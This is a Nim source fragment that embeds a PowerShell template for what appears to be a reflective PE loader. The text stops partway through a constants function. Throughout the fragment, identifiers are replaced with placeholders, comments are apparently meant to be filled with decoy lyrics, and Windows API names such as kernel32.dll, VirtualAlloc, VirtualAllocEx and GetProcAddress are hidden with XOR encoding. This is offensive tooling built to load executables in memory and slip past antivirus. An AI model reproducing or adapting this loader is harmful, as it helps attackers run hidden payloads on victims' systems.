let Powershelltemplate* = """

function FUN000 {
# LYRICS001
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [Byte[]]
        $VAR001,
# LYRICS002
        [Parameter(Position = 1)]
        [String[]]
        $VAR002,
# LYRICS003
        [Parameter(Position = 2)]
        [ValidateSet( 'WideStr', 'Str', 'NoOutput', 'DefaultSettings' )]
        [String]
        $VAR003 = 'DefaultSettings',
# LYRICS004
        [Parameter(Position = 3)]
        [String]
        $VAR004,
# LYRICS005
        [Parameter(Position = 4)]
        [Int32]
        $VAR005,
# LYRICS006
        [Parameter(Position = 5)]
        [String]
        $VAR006,
# LYRICS007
        [Switch]
        $VAR007,
# LYRICS008
        [Switch]
        $VAR008
    )
# LYRICS009
    Set-StrictMode -Version 2
# LYRICS010

$VAR099 = [System.Runtime.InteropServices.Marshal]
$VAR098 = [System.Runtime.InteropServices.MarshalAsAttribute]
$VAR097 = [System.Runtime.InteropServices.UnmanagedType]
$VAR096 = 'GetDelegateForFunctionPointer'
$VAR095 = [IntPtr]

# LYRICS011
    $VAR009 = {
        [CmdletBinding()]
        Param(
            [Parameter(Position = 0, Mandatory = $true)]
            [Byte[]]
            $VAR001,
# LYRICS012
            [Parameter(Position = 1, Mandatory = $true)]
            [String]
            $VAR003,
# LYRICS013
            [Parameter(Position = 2, Mandatory = $true)]
            [Int32]
            $VAR005,
# LYRICS014
            [Parameter(Position = 3, Mandatory = $true)]
            [String]
            $VAR006,
# LYRICS015
            [Parameter(Position = 4, Mandatory = $true)]
            [Bool]
            $VAR007,
# LYRICS016
            [Parameter(Position = 5, Mandatory = $true)]
            [String]
            $VAR004
        )
# LYRICS017
# LYRICS018
# LYRICS019
# LYRICS020
        Function FUN001 {
# LYRICS021
# LYRICS022
            $VAR010 = New-Object System.Object
# LYRICS023
# LYRICS024
# LYRICS025
            $Domain = [AppDomain]::CurrentDomain
# LYRICS026
# LYRICS027
            $VAR012 = New-Object System.Reflection.AssemblyName('DynamicAssembly')
# LYRICS028
# LYRICS029
            $VAR013 = $Domain.DefineDynamicAssembly($VAR012, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
            $VAR014 = $VAR013.DefineDynamicModule('DynamicModule', $false)
# LYRICS030
# LYRICS031
            $VAR015 = $VAR098.GetConstructors()[0]
# LYRICS032
# LYRICS033
# LYRICS034
# LYRICS035
            $VAR011 = $VAR014.DefineEnum('MachineType', 'Public', [UInt16])
            $VAR011.DefineLiteral('Native', [UInt16] 0) | Out-Null
            $VAR011.DefineLiteral('CONST089', [UInt16] 0x014c) | Out-Null
            $VAR011.DefineLiteral('CONST090', [UInt16] 0x0200) | Out-Null
# LYRICS036
# LYRICS037
            $VAR011.DefineLiteral('CONST091', [UInt16] 0x8664) | Out-Null
            $VAR016 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name MachineType -Value $VAR016
# LYRICS038
# LYRICS039
            $VAR011 = $VAR014.DefineEnum('MagicType', 'Public', [UInt16])
            $VAR011.DefineLiteral('CONST100', [UInt16] 0x10b) | Out-Null
            $VAR011.DefineLiteral('CONST101', [UInt16] 0x20b) | Out-Null
            $VAR021 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name MagicType -Value $VAR021
# LYRICS040
# LYRICS041
            $VAR011 = $VAR014.DefineEnum('CONST047Type', 'Public', [UInt16])
            $VAR011.DefineLiteral('CONST102', [UInt16] 0) | Out-Null
            $VAR011.DefineLiteral('CONST103', [UInt16] 1) | Out-Null
            $VAR011.DefineLiteral('CONST104', [UInt16] 2) | Out-Null
            $VAR011.DefineLiteral('CONST099', [UInt16] 3) | Out-Null
            $VAR011.DefineLiteral('CONST098', [UInt16] 7) | Out-Null
# LYRICS042
# LYRICS043
            $VAR011.DefineLiteral('CONST097', [UInt16] 9) | Out-Null
            $VAR011.DefineLiteral('CONST096', [UInt16] 10) | Out-Null
            $VAR011.DefineLiteral('CONST095', [UInt16] 11) | Out-Null
            $VAR011.DefineLiteral('CONST094', [UInt16] 12) | Out-Null
# LYRICS044
# LYRICS045
            $VAR011.DefineLiteral('CONST093', [UInt16] 13) | Out-Null
            $VAR011.DefineLiteral('CONST092', [UInt16] 14) | Out-Null
            $VAR017 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST047Type -Value $VAR017
# LYRICS046
# LYRICS047
            $VAR011 = $VAR014.DefineEnum('CONST035Type', 'Public', [UInt16])
            $VAR011.DefineLiteral('CONST080', [UInt16] 0x0001) | Out-Null
            $VAR011.DefineLiteral('CONST079', [UInt16] 0x0002) | Out-Null
            $VAR011.DefineLiteral('CONST078', [UInt16] 0x0004) | Out-Null
            $VAR011.DefineLiteral('CONST077', [UInt16] 0x0008) | Out-Null
            $VAR011.DefineLiteral('CONST088', [UInt16] 0x0040) | Out-Null
            $VAR011.DefineLiteral('CONST087', [UInt16] 0x0080) | Out-Null
# LYRICS048
# LYRICS049
            $VAR011.DefineLiteral('CONST086', [UInt16] 0x0100) | Out-Null
            $VAR011.DefineLiteral('CONST085', [UInt16] 0x0200) | Out-Null
            $VAR011.DefineLiteral('CONST084', [UInt16] 0x0400) | Out-Null
            $VAR011.DefineLiteral('CONST083', [UInt16] 0x0800) | Out-Null
            $VAR011.DefineLiteral('CONST076', [UInt16] 0x1000) | Out-Null
            $VAR011.DefineLiteral('CONST082', [UInt16] 0x2000) | Out-Null
            $VAR011.DefineLiteral('CONST081', [UInt16] 0x8000) | Out-Null
            $VAR018 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST035Type -Value $VAR018
# LYRICS050
# LYRICS051
# LYRICS052
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST075', $VAR019, [System.ValueType], 8)
        ($VAR011.DefineField('CONST074', [UInt32], 'Public')).SetOffset(0) | Out-Null
# LYRICS053
# LYRICS054
        ($VAR011.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
            $VAR020 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST075 -Value $VAR020
# LYRICS055
# LYRICS056
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST073', $VAR019, [System.ValueType], 20)
            $VAR011.DefineField('Machine', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST072', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST071', [UInt32], 'Public') | Out-Null
# LYRICS057
# LYRICS058
            $VAR011.DefineField('CONST070', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST069', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST068', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST067', [UInt16], 'Public') | Out-Null
            $VAR022 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST073 -Value $VAR022
# LYRICS059
# LYRICS060
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST066', $VAR019, [System.ValueType], 240)
        ($VAR011.DefineField('Magic', $VAR021, 'Public')).SetOffset(0) | Out-Null
        ($VAR011.DefineField('CONST065', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($VAR011.DefineField('CONST064', [Byte], 'Public')).SetOffset(3) | Out-Null
# LYRICS061
# LYRICS062
        ($VAR011.DefineField('CONST063', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($VAR011.DefineField('CONST062', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($VAR011.DefineField('CONST061', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($VAR011.DefineField('CONST060', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($VAR011.DefineField('CONST059', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($VAR011.DefineField('CONST058', [UInt64], 'Public')).SetOffset(24) | Out-Null
        ($VAR011.DefineField('CONST057', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($VAR011.DefineField('CONST056', [UInt32], 'Public')).SetOffset(36) | Out-Null
# LYRICS063
# LYRICS064
        ($VAR011.DefineField('CONST055', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($VAR011.DefineField('CONST054', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($VAR011.DefineField('CONST053', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($VAR011.DefineField('CONST052', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($VAR011.DefineField('CONST051', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($VAR011.DefineField('CONST050', [UInt16], 'Public')).SetOffset(50) | Out-Null
# LYRICS065
# LYRICS066
        ($VAR011.DefineField('CONST049', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($VAR011.DefineField('CONST033', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($VAR011.DefineField('CONST034', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($VAR011.DefineField('CONST048', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($VAR011.DefineField('CONST047', $VAR017, 'Public')).SetOffset(68) | Out-Null
        ($VAR011.DefineField('CONST035', $VAR018, 'Public')).SetOffset(70) | Out-Null
        ($VAR011.DefineField('CONST046', [UInt64], 'Public')).SetOffset(72) | Out-Null
        ($VAR011.DefineField('CONST045', [UInt64], 'Public')).SetOffset(80) | Out-Null
        ($VAR011.DefineField('CONST044', [UInt64], 'Public')).SetOffset(88) | Out-Null
        ($VAR011.DefineField('CONST043', [UInt64], 'Public')).SetOffset(96) | Out-Null
# LYRICS067
# LYRICS068
        ($VAR011.DefineField('CONST105', [UInt32], 'Public')).SetOffset(104) | Out-Null
        ($VAR011.DefineField('CONST106', [UInt32], 'Public')).SetOffset(108) | Out-Null
        ($VAR011.DefineField('CONST107', $VAR020, 'Public')).SetOffset(112) | Out-Null
        ($VAR011.DefineField('CONST108', $VAR020, 'Public')).SetOffset(120) | Out-Null
        ($VAR011.DefineField('CONST109', $VAR020, 'Public')).SetOffset(128) | Out-Null
        ($VAR011.DefineField('CONST110', $VAR020, 'Public')).SetOffset(136) | Out-Null
        ($VAR011.DefineField('CONST111', $VAR020, 'Public')).SetOffset(144) | Out-Null
        ($VAR011.DefineField('CONST112', $VAR020, 'Public')).SetOffset(152) | Out-Null
        ($VAR011.DefineField('Debug', $VAR020, 'Public')).SetOffset(160) | Out-Null
# LYRICS069
# LYRICS070
        ($VAR011.DefineField('Architecture', $VAR020, 'Public')).SetOffset(168) | Out-Null
        ($VAR011.DefineField('CONST113', $VAR020, 'Public')).SetOffset(176) | Out-Null
        ($VAR011.DefineField('CONST114', $VAR020, 'Public')).SetOffset(184) | Out-Null
        ($VAR011.DefineField('CONST115', $VAR020, 'Public')).SetOffset(192) | Out-Null
        ($VAR011.DefineField('CONST120', $VAR020, 'Public')).SetOffset(200) | Out-Null
# LYRICS071
# LYRICS072
        ($VAR011.DefineField('IAT', $VAR020, 'Public')).SetOffset(208) | Out-Null
        ($VAR011.DefineField('CONST116', $VAR020, 'Public')).SetOffset(216) | Out-Null
        ($VAR011.DefineField('CONST117', $VAR020, 'Public')).SetOffset(224) | Out-Null
# LYRICS073
# LYRICS074
        ($VAR011.DefineField('Reserved', $VAR020, 'Public')).SetOffset(232) | Out-Null
            $VAR023 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST066 -Value $VAR023
# LYRICS075
# LYRICS076
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST118', $VAR019, [System.ValueType], 224)
        ($VAR011.DefineField('Magic', $VAR021, 'Public')).SetOffset(0) | Out-Null
        ($VAR011.DefineField('CONST065', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($VAR011.DefineField('CONST064', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($VAR011.DefineField('CONST063', [UInt32], 'Public')).SetOffset(4) | Out-Null
# LYRICS077
# LYRICS078
        ($VAR011.DefineField('CONST062', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($VAR011.DefineField('CONST061', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($VAR011.DefineField('CONST060', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($VAR011.DefineField('CONST059', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($VAR011.DefineField('CONST119', [UInt32], 'Public')).SetOffset(24) | Out-Null
        ($VAR011.DefineField('CONST058', [UInt32], 'Public')).SetOffset(28) | Out-Null
        ($VAR011.DefineField('CONST057', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($VAR011.DefineField('CONST056', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($VAR011.DefineField('CONST055', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($VAR011.DefineField('CONST054', [UInt16], 'Public')).SetOffset(42) | Out-Null
# LYRICS079
# LYRICS080
        ($VAR011.DefineField('CONST053', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($VAR011.DefineField('CONST052', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($VAR011.DefineField('CONST051', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($VAR011.DefineField('CONST050', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($VAR011.DefineField('CONST049', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($VAR011.DefineField('CONST033', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($VAR011.DefineField('CONST034', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($VAR011.DefineField('CONST048', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($VAR011.DefineField('CONST047', $VAR017, 'Public')).SetOffset(68) | Out-Null
        ($VAR011.DefineField('CONST035', $VAR018, 'Public')).SetOffset(70) | Out-Null
        ($VAR011.DefineField('CONST046', [UInt32], 'Public')).SetOffset(72) | Out-Null
        ($VAR011.DefineField('CONST045', [UInt32], 'Public')).SetOffset(76) | Out-Null
# LYRICS081
# LYRICS082
        ($VAR011.DefineField('CONST044', [UInt32], 'Public')).SetOffset(80) | Out-Null
        ($VAR011.DefineField('CONST043', [UInt32], 'Public')).SetOffset(84) | Out-Null
        ($VAR011.DefineField('CONST105', [UInt32], 'Public')).SetOffset(88) | Out-Null
        ($VAR011.DefineField('CONST106', [UInt32], 'Public')).SetOffset(92) | Out-Null
        ($VAR011.DefineField('CONST107', $VAR020, 'Public')).SetOffset(96) | Out-Null
        ($VAR011.DefineField('CONST108', $VAR020, 'Public')).SetOffset(104) | Out-Null
        ($VAR011.DefineField('CONST109', $VAR020, 'Public')).SetOffset(112) | Out-Null
        ($VAR011.DefineField('CONST110', $VAR020, 'Public')).SetOffset(120) | Out-Null
        ($VAR011.DefineField('CONST111', $VAR020, 'Public')).SetOffset(128) | Out-Null
        ($VAR011.DefineField('CONST112', $VAR020, 'Public')).SetOffset(136) | Out-Null
        ($VAR011.DefineField('Debug', $VAR020, 'Public')).SetOffset(144) | Out-Null
        ($VAR011.DefineField('Architecture', $VAR020, 'Public')).SetOffset(152) | Out-Null
        ($VAR011.DefineField('CONST113', $VAR020, 'Public')).SetOffset(160) | Out-Null
# LYRICS083
# LYRICS084
        ($VAR011.DefineField('CONST114', $VAR020, 'Public')).SetOffset(168) | Out-Null
        ($VAR011.DefineField('CONST115', $VAR020, 'Public')).SetOffset(176) | Out-Null
        ($VAR011.DefineField('CONST120', $VAR020, 'Public')).SetOffset(184) | Out-Null
        ($VAR011.DefineField('IAT', $VAR020, 'Public')).SetOffset(192) | Out-Null
# LYRICS085
# LYRICS086
        ($VAR011.DefineField('CONST116', $VAR020, 'Public')).SetOffset(200) | Out-Null
        ($VAR011.DefineField('CONST117', $VAR020, 'Public')).SetOffset(208) | Out-Null
        ($VAR011.DefineField('Reserved', $VAR020, 'Public')).SetOffset(216) | Out-Null
            $VAR024 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST118 -Value $VAR024
# LYRICS087
# LYRICS088
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST03164', $VAR019, [System.ValueType], 264)
            $VAR011.DefineField('Signature', [UInt32], 'Public') | Out-Null
# LYRICS089
# LYRICS090
            $VAR011.DefineField('CONST121', $VAR022, 'Public') | Out-Null
            $VAR011.DefineField('CONST122', $VAR023, 'Public') | Out-Null
# LYRICS091
# LYRICS092
            $VAR025 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST03164 -Value $VAR025
# LYRICS093
# LYRICS094
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
# LYRICS095
# LYRICS096
            $VAR011 = $VAR014.DefineType('CONST03132', $VAR019, [System.ValueType], 248)
            $VAR011.DefineField('Signature', [UInt32], 'Public') | Out-Null
# LYRICS097
# LYRICS098
            $VAR011.DefineField('CONST121', $VAR022, 'Public') | Out-Null
            $VAR011.DefineField('CONST122', $VAR024, 'Public') | Out-Null
            $VAR026 = $VAR011.CreateType()
# LYRICS099
# LYRICS100
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST03132 -Value $VAR026
# LYRICS101
# LYRICS102
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST123', $VAR019, [System.ValueType], 64)
            $VAR011.DefineField('CONST124', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST125', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST126', [UInt16], 'Public') | Out-Null
# LYRICS103
# LYRICS104
            $VAR011.DefineField('CONST127', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST128', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST129', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST130', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST131', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST132', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST133', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST134', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST135', [UInt16], 'Public') | Out-Null
# LYRICS105
# LYRICS106
            $VAR011.DefineField('CONST136', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST137', [UInt16], 'Public') | Out-Null
# LYRICS107
            $VAR027 = $VAR011.DefineField('CONST138', [UInt16[]], 'Public, HasFieldMarshal')
# LYRICS108
# LYRICS109
            $VAR028 = $VAR097::ByValArray
            $VAR029 = @($VAR098.GetField('SizeConst'))
# LYRICS110
# LYRICS111
            $VAR030 = New-Object System.Reflection.Emit.CustomAttributeBuilder($VAR015, $VAR028, $VAR029, @([Int32] 4))
            $VAR027.SetCustomAttribute($VAR030)
# LYRICS112
            $VAR011.DefineField('CONST139', [UInt16], 'Public') | Out-Null
# LYRICS113
# LYRICS114
            $VAR011.DefineField('CONST140', [UInt16], 'Public') | Out-Null
# LYRICS115
# LYRICS116
            $VAR031 = $VAR011.DefineField('CONST1382', [UInt16[]], 'Public, HasFieldMarshal')
            $VAR028 = $VAR097::ByValArray
# LYRICS117
# LYRICS118
            $VAR030 = New-Object System.Reflection.Emit.CustomAttributeBuilder($VAR015, $VAR028, $VAR029, @([Int32] 10))
# LYRICS119
# LYRICS120
            $VAR031.SetCustomAttribute($VAR030)
# LYRICS121
            $VAR011.DefineField('CONST141', [Int32], 'Public') | Out-Null
            $VAR032 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST123 -Value $VAR032
# LYRICS122
# LYRICS123
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST142', $VAR019, [System.ValueType], 40)
# LYRICS124
# LYRICS125
# LYRICS126
            $VAR033 = $VAR011.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
            $VAR028 = $VAR097::ByValArray
# LYRICS127
# LYRICS128
            $VAR030 = New-Object System.Reflection.Emit.CustomAttributeBuilder($VAR015, $VAR028, $VAR029, @([Int32] 8))
            $VAR033.SetCustomAttribute($VAR030)
# LYRICS129
            $VAR011.DefineField('CONST143', [UInt32], 'Public') | Out-Null
# LYRICS130
# LYRICS131
            $VAR011.DefineField('CONST074', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST144', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST145', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST146', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST147', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST148', [UInt16], 'Public') | Out-Null
# LYRICS132
# LYRICS133
            $VAR011.DefineField('CONST149', [UInt16], 'Public') | Out-Null
# LYRICS134
# LYRICS135
            $VAR011.DefineField('CONST067', [UInt32], 'Public') | Out-Null
            $VAR034 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST142 -Value $VAR034
# LYRICS136
# LYRICS137
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST150', $VAR019, [System.ValueType], 8)
            $VAR011.DefineField('CONST074', [UInt32], 'Public') | Out-Null
# LYRICS138
# LYRICS139
            $VAR011.DefineField('CONST151', [UInt32], 'Public') | Out-Null
            $VAR035 = $VAR011.CreateType()
# LYRICS140
# LYRICS141
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST150 -Value $VAR035
# LYRICS142
# LYRICS143
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST152', $VAR019, [System.ValueType], 20)
            $VAR011.DefineField('CONST067', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST071', [UInt32], 'Public') | Out-Null
# LYRICS144
# LYRICS145
            $VAR011.DefineField('CONST153', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('Name', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST154', [UInt32], 'Public') | Out-Null
            $VAR036 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST152 -Value $VAR036
# LYRICS146
# LYRICS147
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST155', $VAR019, [System.ValueType], 40)
            $VAR011.DefineField('CONST067', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST071', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST156', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST157', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('Name', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('Base', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST158', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST159', [UInt32], 'Public') | Out-Null
# LYRICS148
# LYRICS149
            $VAR011.DefineField('CONST160', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST161', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST162', [UInt32], 'Public') | Out-Null
            $VAR037 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST155 -Value $VAR037
# LYRICS150
# LYRICS151
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST163', $VAR019, [System.ValueType], 8)
            $VAR011.DefineField('CONST164', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST165', [UInt32], 'Public') | Out-Null
            $VAR038 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST163 -Value $VAR038
# LYRICS152
# LYRICS153
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST166', $VAR019, [System.ValueType], 12)
            $VAR011.DefineField('CONST163', $VAR038, 'Public') | Out-Null
# LYRICS154
# LYRICS155
            $VAR011.DefineField('Attributes', [UInt32], 'Public') | Out-Null
            $VAR039 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST166 -Value $VAR039
# LYRICS156
# LYRICS157
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST167', $VAR019, [System.ValueType], 16)
# LYRICS158
# LYRICS159
            $VAR011.DefineField('CONST168', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST169', $VAR039, 'Public') | Out-Null
            $VAR040 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST167 -Value $VAR040
# LYRICS160
            return $VAR010
        }
# LYRICS161
        Function FUN100
        {
        Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [byte[]]
                $VAR0320
            )
# LYRICS162
            $VAR0322 = [Byte]0x5A
# LYRICS163
# LYRICS164
            $VAR0321 = for ($i = 0; $i -lt $VAR0320.Length; $i++) { [char]([Byte]$VAR0320[$i] -bxor $VAR0322) } -join ''
# LYRICS165
# LYRICS166
# LYRICS167
            return [String]($VAR0321 | ForEach-Object { $_ }) -join ""
# LYRICS168
        }
# LYRICS169
        $VAR0303 = [Byte]0x5A
        $VAR0300 = 49,63,40,52,63,54,105,104,116,62,54,54
# LYRICS170
# LYRICS171
        $VAR0301 = for ($i = 0; $i -lt $VAR0300.Length; $i++) { [char]([Byte]$VAR0300[$i] -bxor $VAR0303) } -join ''
        $VAR0302 = ($VAR0301 | ForEach-Object { $_ }) -join ""
# LYRICS172
        $VAR0304 = 27,62,44,59,42,51,105,104,116,62,54,54
        $VAR0305 = for ($i = 0; $i -lt $VAR0304.Length; $i++) { [char]([Byte]$VAR0304[$i] -bxor $VAR0303) } -join ''
# LYRICS173
# LYRICS174
        $VAR0306 = ($VAR0305 | ForEach-Object { $_ }) -join ""
# LYRICS175
        $VAR0307 = 55,41,44,57,40,46,116,62,54,54
        $VAR0308 = for ($i = 0; $i -lt $VAR0307.Length; $i++) { [char]([Byte]$VAR0307[$i] -bxor $VAR0303) } -join ''
# LYRICS176
# LYRICS177
        $VAR0309 = ($VAR0308 | ForEach-Object { $_ }) -join ""
# LYRICS178
        $VAR0310 = 29,63,46,10,40,53,57,27,62,62,40,63,41,41
# LYRICS179
# LYRICS180
        $VAR0311 = for ($i = 0; $i -lt $VAR0310.Length; $i++) { [char]([Byte]$VAR0310[$i] -bxor $VAR0303) } -join ''
# LYRICS181
# LYRICS182
        $VAR0312 = ($VAR0311 | ForEach-Object { $_ }) -join ""
# LYRICS183
        $VAR0313 = 12,51,40,46,47,59,54,27,54,54,53,57
        $VAR0314 = for ($i = 0; $i -lt $VAR0313.Length; $i++) { [char]([Byte]$VAR0313[$i] -bxor $VAR0303) } -join ''
# LYRICS184
# LYRICS185
        $VAR0315 = ($VAR0314 | ForEach-Object { $_ }) -join ''
# LYRICS186
        $VAR0316 = 12,51,40,46,47,59,54,27,54,54,53,57,31,34
        $VAR0317 = for ($i = 0; $i -lt $VAR0316.Length; $i++) { [char]([Byte]$VAR0316[$i] -bxor $VAR0303) } -join ''
# LYRICS187
# LYRICS188
        $VAR0318 = ($VAR0317 | ForEach-Object { $_ }) -join ''
# LYRICS189
                    $VAR0327 = 22,53,59,62,22,51,56,40,59,40,35,27
# LYRICS190
# LYRICS191
            $VAR0328 = for ($i = 0; $i -lt $VAR0327.Length; $i++) { [char]([Byte]$VAR0327[$i] -bxor $VAR0303) } -join ''
            $VAR0329 = ($VAR0328 | ForEach-Object { $_ }) -join ''
# LYRICS192
# LYRICS193
# LYRICS194
        Function FUN002 {
# LYRICS195
# LYRICS196
            $VAR0041 = New-Object System.Object
# LYRICS197
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST001 -Value 0x00001000
# LYRICS198
# LYRICS199
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST002 -Value 0x00002000
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST003 -Value 0x01
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST004 -Value 0x02
# LYRICS200
# LYRICS201
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST005 -Value 0x04
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST006 -Value 0x08
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST007 -Value 0x10
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST009 -Value 0x20
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST008 -Value 0x40
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST010 -Value 0x80
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST011 -Value 0x200
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST012 -Value 0
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST013 -Value 3
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST014 -Value 10
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST015 -Value 0x02000000
# LYRICS202
